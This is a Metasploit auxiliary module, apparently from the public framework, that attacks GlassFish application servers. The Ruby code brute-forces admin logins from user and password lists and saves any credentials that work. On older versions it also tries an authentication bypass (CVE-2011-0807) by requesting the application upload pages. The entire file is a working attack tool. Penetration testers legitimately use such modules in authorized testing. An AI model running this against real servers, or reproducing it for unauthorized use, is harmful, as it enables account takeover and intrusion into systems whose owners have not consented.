##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/login_scanner/glassfish'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'GlassFish Brute Force Utility',
      'Description'    => %q{
        This module attempts to login to GlassFish instance using username and password
        combindations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
        It will also try to do an authentication bypass against older versions of GlassFish.
        Note: by default, GlassFish 4.0 requires HTTPS, which means you must set the SSL option
        to true, and SSLVersion to TLS1. It also needs Secure Admin to access the DAS remotely.
      },
      'Author'         =>
        [
          'Joshua Abraham <jabra[at]spl0it.org>', # @Jabra
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2011-0807'],
          ['OSVDB', '71948']
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(4848),
        OptString.new('TARGETURI', [true, 'The URI path of the GlassFish Server', '/']),
        OptString.new('USERNAME',[true, 'A specific username to authenticate as','admin']),
        OptBool.new('SSL', [false, 'Negotiate SSL for outgoing connections', false]),
        OptEnum.new('SSLVersion', [false, 'Specify the version of SSL that should be used', 'TLS1', ['SSL2', 'SSL3', 'TLS1']])
      ], self.class)
  end

  #
  # Module tracks the session id, and then it will have to pass the last known session id to
  # the LoginScanner class so the authentication can proceed properly
  #

  def jsession
    @jsession || ''
  end

  def set_jsession(res)
    if res and res.get_cookies =~ /JSESSIONID=(\w*);/i
      @scanner.jsession = $1
    end
  end

  # Overrides the ssl method from HttpClient
  def ssl
    @scanner.ssl || datastore['SSL']
  end

  #
  # Return GlassFish's edition (Open Source or Commercial) and version (2.x, 3.0, 3.1, 9.x, 4.0) and
  # banner (ex: Sun Java System Application Server 9.x)
  #
  def get_version(res)
    # Extract banner from response
    banner = res.headers['Server'] || ''

    # Default value for edition and glassfish version
    edition = 'Commercial'
    version = 'Unknown'

    # Set edition (Open Source or Commercial)
    p = /(Open Source|Sun GlassFish Enterprise Server|Sun Java System Application Server)/
    edition = 'Open Source' if banner =~ p

    # Set version.  Some GlassFish servers return banner "GlassFish v3".
    if banner =~ /(GlassFish Server|Open Source Edition)[[:blank:]]*(\d\.\d)/
      version = $2
    elsif banner =~ /GlassFish v(\d)/ and version.nil?
      version = $1
    elsif banner =~ /Sun GlassFish Enterprise Server v2/ and version.nil?
      version = '2.x'
    elsif banner =~ /Sun Java System Application Server 9/ and version.nil?
      version = '9.x'
    end

    return edition, version, banner
  end


  def try_glassfish_auth_bypass(version)
    print_status('Trying GlassFish authentication bypass..')
    success = false

    if version =~ /^[29]\.x$/
      res = send_request('/applications/upload.jsf', 'get')
      set_jsession(res)
      p = /<title>Deploy Enterprise Applications\/Modules/
      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
        success = true
      end
    elsif version =~ /^3\./
      res = send_request('/common/applications/uploadFrame.jsf', 'get')
      set_jsession(res)
      p = /<title>Deploy Applications or Modules/
      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
        success = true
      end
    end

    success
  end


  def init_loginscanner(ip)
    @cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['PASSWORD'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['USERNAME'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    @scanner = Metasploit::Framework::LoginScanner::Glassfish.new(
      host:               ip,
      port:               rport,
      uri:                datastore['URI'],
      proxies:            datastore["PROXIES"],
      cred_details:       @cred_collection,
      stop_on_success:    datastore['STOP_ON_SUCCESS'],
      connection_timeout: 5
    )

    # It doesn't look like we can configure SSL and SSL version with the HTTP class,
    # so we do this from Glassfish
    @scanner.ssl         = datastore['SSL']
    @scanner.ssl_version = datastore['SSLVERSION']
  end

  def do_report(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def bruteforce(ip)
    @scanner.scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
        do_report(ip, rport, result)
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
      end
    end
  end


  def init_bruteforce
    res   = nil
    tried = false

    begin
      print_status("Sending a request to /common/index.jsf...")
      res = send_request_cgi({'uri'=>'/common/index.jsf'})
      set_jsession(res)

      # Abort if res returns nil due to an exception (broken pipe or timeout)
      if res.nil?
        print_error('Unable to get a response from the server.')
        return
      end

      # Automatic HTTP to HTTPS transition (when needed)
      if @scanner.ssl == false and res and res.headers['Location'] =~ /^https:\/\//
        print_status("Glassfish is asking us to use HTTPS")
        print_status("SSL option automatically set to: true")
        print_status("SSL version option automatically set to: #{datastore['SSLVersion']}")
        @scanner.ssl = true
        @scanner.ssl_version = datastore['SSLVersion']
        # Set the SSL options, and let the exception handler to resend the HTTP request
        # one more time.
        raise "SSL error"
      end
    rescue ::Exception => e
      # Retry the HTTP request with updated SSL options
      if e.message == 'SSL error' and tried == false
        tried = true
        retry
      else
        # Make sure we don't shut other problems up
        raise e
      end
    end

    # A normal client starts with /login.jsf, so we start with /login.jsf
    if res and res.code.to_i == 302
      res = send_request_cgi({'uri' => '/login.jsf'})
      set_jsession(res)
    end

    res
  end


  #
  # main
  #
  def run_host(ip)
    init_loginscanner(ip)
    res = init_bruteforce
    edition, version, banner = get_version(res)
    @scanner.version = version

    print_status('Attempting authentication...')

    if version =~ /^[239]\.x$/
      print_status("This version might be vulnerable to an authentication bypass, testing...")
      try_glassfish_auth_bypass(version)
    end

    begin
      bruteforce(ip) unless version.blank?
    rescue ::Metasploit::Framework::LoginScanner::GlassfishError => e
      print_error(e.message)
    end
  end

end
